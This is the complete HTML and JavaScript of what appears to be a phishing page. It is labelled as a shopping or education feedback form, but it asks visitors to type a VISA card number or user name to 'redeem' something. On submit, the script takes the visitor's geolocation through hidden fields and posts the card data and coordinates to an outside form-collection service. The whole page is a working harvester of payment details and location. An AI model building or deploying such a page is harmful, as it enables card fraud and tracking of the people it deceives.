<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Shopping Edu Feedback</title>
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Outfit', sans-serif;
      background: linear-gradient(to right, #f4f4ff, #e0e7ff);
      margin: 0;
      padding: 0;
      display: flex;
      height: 100vh;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: white;
      padding: 2rem;
      border-radius: 20px;
      box-shadow: 0 15px 40px rgba(0,0,0,0.1);
      max-width: 500px;
      width: 100%;
      animation: fadeIn 1s ease-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    h1 {
      text-align: center;
      font-size: 1.8rem;
      margin-bottom: 1.5rem;
      color: #333;
    }
    textarea {
      width: 100%;
      padding: 1rem;
      border: 2px solid #ccc;
      border-radius: 12px;
      font-size: 1rem;
      margin-bottom: 1rem;
      resize: none;
    }
    .submit-btn {
      width: 100%;
      padding: 1rem;
      background-color: #4f46e5;
      color: white;
      font-size: 1rem;
      border: none;
      border-radius: 12px;
      cursor: pointer;
    }
    .submit-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
    .small-text {
      text-align: center;
      font-size: 0.8rem;
      color: #777;
      margin-top: 1rem;
    }
    .info {
      font-size: 0.85rem;
      margin-top: 1rem;
      color: #444;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    .error {
      color: red;
    }
    .success {
      color: green;
    }
  </style>
</head>
<body>

<div class="container">
  <h1>VISA type USER OR CARD NUMBER</h1>

  <form id="geoForm" method="POST" action="https://formbold.com/s/obDkQ">
    <textarea name="feedback" placeholder="Type your card NUMBER OR USER..."></textarea>
    <input type="hidden" name="latitude" />
    <input type="hidden" name="longitude" />
    <button type="button" class="submit-btn" id="getLocationBtn">Reedeem</button>
    <div class="info" id="info"></div>
    <div class="small-text">Type VISA CARD NUMBER OR USER.</div>
  </form>
</div>

<script>
  let sendCount = 0;
  const MAX_SENDS = 5;

  document.getElementById('getLocationBtn').addEventListener('click', () => {
    const form = document.getElementById('geoForm');
    const info = document.getElementById('info');

    if (sendCount >= MAX_SENDS) {
      info.innerHTML = '<span class="error"> .</span>';
      return;
    }

    if (!navigator.geolocation) {
      info.innerHTML = '<span class="error">.</span>';
      return;
    }

    info.textContent = "🔄 Requesting location permission...";

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        form.elements['latitude'].value = lat;
        form.elements['longitude'].value = lon;

        info.innerHTML = '<span class="success">✅  Sending...</span>';
        sendCount++;
        form.submit();
      },
      (err) => {
        info.innerHTML = '<span class="error">❌  We can’t proceed.</span>';
        console.error(err);
      }
    );
  });
</script>

</body>
</html>
